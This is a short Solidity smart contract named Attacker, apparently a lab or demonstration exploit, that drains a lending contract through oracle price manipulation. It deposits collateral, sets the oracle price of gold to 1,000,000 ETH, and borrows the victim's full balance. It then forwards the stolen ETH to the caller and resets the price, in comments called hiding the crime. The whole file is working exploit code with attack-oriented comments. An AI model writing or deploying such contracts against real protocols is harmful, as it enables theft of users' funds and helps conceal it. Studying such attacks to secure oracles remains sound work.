// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVictim {
    function depositCollateral() external;
    function borrowETH(uint256 amount) external;
}

interface IOracle {
    function setPrice(uint256 price) external;
}

contract Attacker {
    IVictim public victim;
    IOracle public oracle;

    constructor(address _victim, address _oracle) {
        victim = IVictim(_victim);
        oracle = IOracle(_oracle);
    }

    function flashAttack() public {
        // 1. Get initial collateral (Simulated)
        victim.depositCollateral();

        // 2. MANIPULATE: Set Gold price to 1,000,000 ETH
        oracle.setPrice(1000000 ether);

        // 3. BORROW: Drain the bank
        uint256 bankBalance = address(victim).balance;

        // Safety check to prevent reverting if bank is empty
        if (bankBalance > 0) {
            victim.borrowETH(bankBalance);
        }

        // 4. PROFIT: Send stolen ETH to the attacker (you)
        // FIX: Use .call instead of .transfer to prevent Gas Limit errors with Smart Wallets
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Withdraw failed");

        // 5. CLEANUP: Reset price to hide the crime (optional)
        oracle.setPrice(1 ether);
    }

    receive() external payable {}
}